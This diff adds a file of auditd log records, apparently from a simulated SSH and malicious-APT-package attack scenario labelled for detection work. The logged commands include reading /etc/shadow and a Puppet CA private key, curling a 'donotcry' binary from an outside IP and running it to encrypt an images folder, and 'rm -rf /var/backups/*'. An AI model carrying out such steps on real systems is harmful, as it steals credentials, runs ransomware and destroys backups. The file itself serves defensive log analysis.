@@ -1,0 +1,130 @@
+# Auto-extracted Offensive Logs: scenario_3_ssh_apt_offensive.log
+# Total chunks: 15
+
+# --- START CHUNK: scenario_3_ssh_apt_off_001 (ALERT) ---
+type=SYSCALL msg=audit(1765535434.444:16250): arch=c000003e syscall=59 success=yes exit=0 a0="Uq10" a1="Uq1" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4303 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="cat" exe="/usr/bin/cat" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535434.444:16250): argc=2 a0="cat" a1="/etc/shadow"
+type=PATH msg=audit(1765535434.444:16250): item=0 name="/usr/bin/cat" inode=1568 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535434.444:16250): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535434.444:16250): proctitle="cat /etc/shadow"
+# --- END CHUNK: scenario_3_ssh_apt_off_001 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_002 (ALERT) ---
+type=SYSCALL msg=audit(1765535449.452:16266): arch=c000003e syscall=59 success=yes exit=0 a0="Uq`" a1="Uq1" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4319 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="cat" exe="/usr/bin/cat" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535449.452:16266): argc=2 a0="cat" a1="/etc/puppetlabs/puppetserver/ca/ca_key.pem"
+type=PATH msg=audit(1765535449.452:16266): item=0 name="/usr/bin/cat" inode=1568 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535449.452:16266): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535449.452:16266): proctitle="cat /etc/puppetlabs/puppetserver/ca/ca_key.pem"
+# --- END CHUNK: scenario_3_ssh_apt_off_002 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_003 (ALERT) ---
+type=SYSCALL msg=audit(1765535464.456:16267): arch=c000003e syscall=59 success=yes exit=0 a0="Uq " a1="Uq" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4320 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="cat" exe="/usr/bin/cat" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535464.456:16267): argc=2 a0="cat" a1="/media/share/healthcheck_cron.sh"
+type=PATH msg=audit(1765535464.456:16267): item=0 name="/usr/bin/cat" inode=1568 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535464.456:16267): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535464.456:16267): proctitle="cat /media/share/healthcheck_cron.sh"
+# --- END CHUNK: scenario_3_ssh_apt_off_003 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_004 (ALERT) ---
+type=SYSCALL msg=audit(1765535550.004:16276): arch=c000003e syscall=59 success=yes exit=0 a0="Uq3p" a1="Uqi" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4323 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="ls" exe="/usr/bin/ls" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535550.004:16276): argc=4 a0="ls" a1="--color=auto" a2="-l" a3="/var/www/html/debian"
+type=PATH msg=audit(1765535550.004:16276): item=0 name="/usr/bin/ls" inode=1580 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535550.004:16276): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535550.004:16276): proctitle="ls --color=auto -l /var/www/html/debian"
+# --- END CHUNK: scenario_3_ssh_apt_off_004 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_005 (ALERT) ---
+type=SYSCALL msg=audit(1765535565.016:16279): arch=c000003e syscall=59 success=yes exit=0 a0="Uq@" a1="Uq3" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4325 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="apt" exe="/usr/bin/apt" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535565.016:16279): argc=2 a0="apt" a1="update"
+type=PATH msg=audit(1765535565.016:16279): item=0 name="/usr/bin/apt" inode=1746 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535565.016:16279): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535565.016:16279): proctitle="apt update"
+# --- END CHUNK: scenario_3_ssh_apt_off_005 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_006 (ALERT) ---
+type=SYSCALL msg=audit(1765535600.024:16931): arch=c000003e syscall=59 success=yes exit=0 a0="Uq" a1="Uq" a2="Uq-p" a3=8 items=2 ppid=4266 pid=4759 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535600.024:16931): argc=2 a0="mkdir" a1="/tmp/.tmux_data"
+type=PATH msg=audit(1765535600.024:16931): item=0 name="/usr/bin/mkdir" inode=1581 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535600.024:16931): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535600.024:16931): proctitle="mkdir /tmp/.tmux_data"
+# --- END CHUNK: scenario_3_ssh_apt_off_006 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_007 (ALERT) ---
+type=SYSCALL msg=audit(1765535630.032:16948): arch=c000003e syscall=59 success=yes exit=0 a0="Uq" a1="Uq " a2="Uq-p" a3=8 items=2 ppid=4266 pid=4772 auid=1002 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm="dpkg-deb" exe="/usr/bin/dpkg-deb" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="john" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765535630.032:16948): argc=4 a0="dpkg-deb" a1="-R" a2="/var/www/html/debian/healthcheckd_1.0-1_amd64.deb" a3="healthcheckd"
+type=PATH msg=audit(1765535630.032:16948): item=0 name="/usr/bin/dpkg-deb" inode=1700 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765535630.032:16948): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=79850 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765535630.032:16948): proctitle="dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd"
+# --- END CHUNK: scenario_3_ssh_apt_off_007 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_008 (ALERT) ---
+type=SYSCALL msg=audit(1765536062.588:3430): arch=c000003e syscall=59 success=yes exit=0 a0="K~u" a1="K~x" a2="ߋ" a3="KTV" items=3 ppid=2339 pid=2340 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=10 comm="dpkg-deb" exe="/usr/bin/dpkg-deb" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536062.588:3430): argc=8 a0="dpkg-deb" a1="-f" a2="/var/cache/apt/archives/healthcheckd_1.0-2_amd64.deb" a3="Package" a4="Source" a5="Version" a6="Architecture" a7="Status"
+type=PATH msg=audit(1765536062.588:3430): item=0 name="/usr/bin/dpkg-deb" inode=1182 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536062.588:3430): item=1 name="/usr/bin/dpkg-deb" inode=1182 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536062.588:3430): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536062.588:3430): proctitle="/usr/bin/python3 /usr/bin/apt-listchanges --apt"
+# --- END CHUNK: scenario_3_ssh_apt_off_008 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_009 (ALERT) ---
+type=SYSCALL msg=audit(1765536405.092:3851): arch=c000003e syscall=59 success=yes exit=0 a0="UMp" a1="UMŰ" a2="UN0" a3="J" items=3 ppid=2520 pid=2521 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="stty" exe="/usr/bin/stty" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536405.092:3851): argc=5 a0="stty" a1="rows" a2="38" a3="columns" a4="116"
+type=PATH msg=audit(1765536405.092:3851): item=0 name="/usr/bin/stty" inode=673 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536405.092:3851): item=1 name="/usr/bin/stty" inode=673 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536405.092:3851): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536405.092:3851): proctitle="stty rows 38 columns 116"
+# --- END CHUNK: scenario_3_ssh_apt_off_009 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_010 (ALERT) ---
+type=SYSCALL msg=audit(1765536437.832:3853): arch=c000003e syscall=59 success=yes exit=0 a0="UNa@" a1="UN" a2="UN0" a3="J" items=3 ppid=2520 pid=2522 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="curl" exe="/usr/bin/curl" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536437.832:3853): argc=2 a0="curl" a1="http://192.42.1.174/donotcry"
+type=PATH msg=audit(1765536437.832:3853): item=0 name="/usr/bin/curl" inode=17482 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536437.832:3853): item=1 name="/usr/bin/curl" inode=17482 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536437.832:3853): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536437.832:3853): proctitle="curl http://192.42.1.174/donotcry"
+# --- END CHUNK: scenario_3_ssh_apt_off_010 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_011 (ALERT) ---
+type=SYSCALL msg=audit(1765536454.200:3855): arch=c000003e syscall=59 success=yes exit=0 a0="UN" a1="UN0" a2="UN0" a3=0 items=2 ppid=2520 pid=2523 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="ld-linux-x86-64" exe="/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536454.200:3855): argc=4 a0="/lib64/ld-linux-x86-64.so.2" a1="/opt/donotcry" a2="encrypt" a3="/media/data/Images"
+type=PATH msg=audit(1765536454.200:3855): item=0 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536454.200:3855): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=6381 dev=fe:01 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536454.200:3855): proctitle="/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+# --- END CHUNK: scenario_3_ssh_apt_off_011 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_012 (ALERT) ---
+type=SYSCALL msg=audit(1765536470.540:6103): arch=c000003e syscall=59 success=yes exit=0 a0="UN" a1="UNp" a2="UN0" a3="J" items=3 ppid=2520 pid=2527 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="find" exe="/usr/bin/find" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536470.540:6103): argc=2 a0="find" a1="/media/data/Images"
+type=PATH msg=audit(1765536470.540:6103): item=0 name="/usr/bin/find" inode=1449 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536470.540:6103): item=1 name="/usr/bin/find" inode=1449 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536470.540:6103): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536470.540:6103): proctitle="find /media/data/Images"
+# --- END CHUNK: scenario_3_ssh_apt_off_012 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_013 (ALERT) ---
+type=SYSCALL msg=audit(1765536486.804:6104): arch=c000003e syscall=59 success=yes exit=0 a0="UN" a1="UNP" a2="UN0" a3="J" items=3 ppid=2520 pid=2528 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="cat" exe="/usr/bin/cat" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536486.804:6104): argc=2 a0="cat" a1="/etc/passwd"
+type=PATH msg=audit(1765536486.804:6104): item=0 name="/usr/bin/cat" inode=564 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536486.804:6104): item=1 name="/usr/bin/cat" inode=564 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536486.804:6104): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536486.804:6104): proctitle="cat /etc/passwd"
+# --- END CHUNK: scenario_3_ssh_apt_off_013 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_014 (ALERT) ---
+type=SYSCALL msg=audit(1765536535.836:11893): arch=c000003e syscall=59 success=yes exit=0 a0="UN " a1="UN0" a2="UN0" a3="J" items=3 ppid=2520 pid=2531 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=13 comm="rm" exe="/usr/bin/rm" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765536535.836:11893): argc=3 a0="rm" a1="-rf" a2="/var/backups/*"
+type=PATH msg=audit(1765536535.836:11893): item=0 name="/usr/bin/rm" inode=670 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536535.836:11893): item=1 name="/usr/bin/rm" inode=670 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765536535.836:11893): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765536535.836:11893): proctitle="rm -rf /var/backups/*"
+# --- END CHUNK: scenario_3_ssh_apt_off_014 ---
+
+# --- START CHUNK: scenario_3_ssh_apt_off_015 (ALERT) ---
+type=SYSCALL msg=audit(1765534536.256:511): arch=c000003e syscall=59 success=yes exit=0 a0="Ux-@" a1="Ux-" a2="Ux-" a3=0 items=3 ppid=556 pid=562 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined key="T1078_Valid_Accounts"ARCH=x86_64 SYSCALL=execve AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
+type=EXECVE msg=audit(1765534536.256:511): argc=6 a0="systemctl" a1="-p" a2="LoadState" a3="--value" a4="show" a5="exim4.service"
+type=PATH msg=audit(1765534536.256:511): item=0 name="/usr/bin/systemctl" inode=6080 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765534536.256:511): item=1 name="/usr/bin/systemctl" inode=6080 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PATH msg=audit(1765534536.256:511): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=2058 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
+type=PROCTITLE msg=audit(1765534536.256:511): proctitle="systemctl -p LoadState --value show exim4.service"
+# --- END CHUNK: scenario_3_ssh_apt_off_015 ---
+
